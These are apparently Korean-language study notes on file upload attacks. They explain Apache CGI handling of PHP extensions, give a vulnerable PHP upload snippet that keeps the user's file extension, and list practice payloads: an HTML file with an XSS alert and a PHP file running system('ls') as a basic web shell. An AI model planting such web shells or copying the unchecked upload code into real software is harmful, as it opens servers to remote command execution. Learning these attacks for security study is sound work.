File Upload :
    서버 파일 시스템에 원하는 파일 경로 또는 파일 명을 업로드 가능 => 웹 앱 또는 서버의 서비스가 참조하는 파일을 업로드해 공격

    웹 서버 CGI 개념 이해 필요
        CGI(Common Gateway Interface) : 사용자의 요청을 받은 서버가 동적인 페이지를 구성하기 위해 엔진에 요청을 보내고 엔진이 처리한 겨로가를 서버에게 반환하는 기능.
        
        ex) 웹서버 = Apache, 웹 어플리케이션 = php
            Apache는 사용자 요청을 해석, 요청하는 리소스의 확장자가 .php 같이 php엔진 사용 하면 mod_php(CGI)를 통해 php 엔진이 처리 및 실행하도록 요청.

            php,jsp,asp등, CGI를 통해 서비스를 하는 형태에서는 확장자를 통해 웹 앱 엔진에 요청 여부를 판단

        Apache 설정 파일 :
        <FilesMatch ".+\.ph(p[3457]?|t|tml)$">
            SetHandler application/x-httpd-php
        </FilesMatch>
        // .php확장자 외에도 .php3/4/5/7, .pht, .phtml 등 php로 처리

    WebShell(웹쉘) : 해당 서버의 쉘을 웹을 통해 사용 (웹 앱 언어에 내장된 OS 명령어 등 사용)

실습 :
    php 코드 : 파일 업로드 부분
    <?php
    if(!empty($_FILES['file'])){
    $filename = generateRandomString(); // custom function
    $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
    $path = "./uploads/" . $filename . "." . $ext;
    if(move_uploaded_file($_FILES['file']['tmp_name'], $path)) {
        return true; // upload success
    } else {
        return false; // upload fail
    }
    }
    ?>

입력 : test.html
    파일 이름 : test.html
    파일 내용 : <script>alert(1);</script>

입력 : test.php
    파일 이름 : test.php
    파일 내용 : <?php
                system("ls");
                ?>

exec only returns the last line of the generated output.
shell_exec returns the full output of the command, when the command finished running.
system immediately shows all output, and is used to show text.
passthru also returns output immediately, but is used for binary data. passthru displays raw data.

.php 파일, html 파일등 업로드해 서버의 엔진이 처리하도록 유도

